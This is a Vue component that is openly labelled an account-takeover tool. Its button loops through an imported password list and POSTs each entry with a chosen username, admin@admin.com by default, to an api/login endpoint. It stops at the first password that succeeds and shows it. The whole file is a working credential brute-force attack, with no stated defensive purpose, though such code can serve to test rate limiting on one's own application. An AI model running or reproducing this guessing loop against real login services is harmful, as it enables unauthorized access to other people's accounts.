<template>
    <div>
        <h5>Tried password - {{completionPercentage}}/100 %</h5>
        <div>
            <button @click="launchRequest">Try Account takeover</button>
            <button @click="stop = true">Reset </button>
        </div>
        <input v-model="username" />
        <p>Tried passsword   {{errors.length + success.length}}/{{passwordListCount}}</p>
        <div class="routes-container">
            <div class="green" v-for="route in success">{{route}}</div>
            <div class="red" v-for="(route) in errors" :key="route">{{route}}</div>
        </div>
    </div>
</template>

<style scoped lang="scss">
.routes-container {
  height: 200px;
  overflow-y: scroll;
  div {
    margin: 2px 0;
  }
}
.green {
  background-color: palegreen;
}
.red {
  background-color: palevioletred;
}
</style>
<script>
import axios from "axios";
import passwordList from "../../data/passwords-list";
export default {
  name: "acount-take-over",
  props: { url: String, until: Number },
  data() {
    return {
      success: [],
      errors: [],
      stop: false,
      passwordListCount: passwordList.length,
      username: "admin@admin.com"
    };
  },
  computed: {
    completionPercentage() {
      return parseInt(
        ((this.success.length + this.errors.length) / passwordList.length) * 100
      );
    }
  },
  methods: {
    launchRequest: async function() {
      this.stop = false;
      this.success = [];
      this.errors = [];
      for (const password of passwordList) {
        if (this.stop) {
          break;
        }
        try {
          await axios({
            baseURL: process.env.VUE_APP_API_URL,
            url: "api/login",
            method: "POST",
            data: { email: this.username, password }
          });
          this.success.unshift(password);
          this.stop = true;
        } catch (e) {
          this.errors.unshift(password);
        }
      }
    }
  }
};
</script>
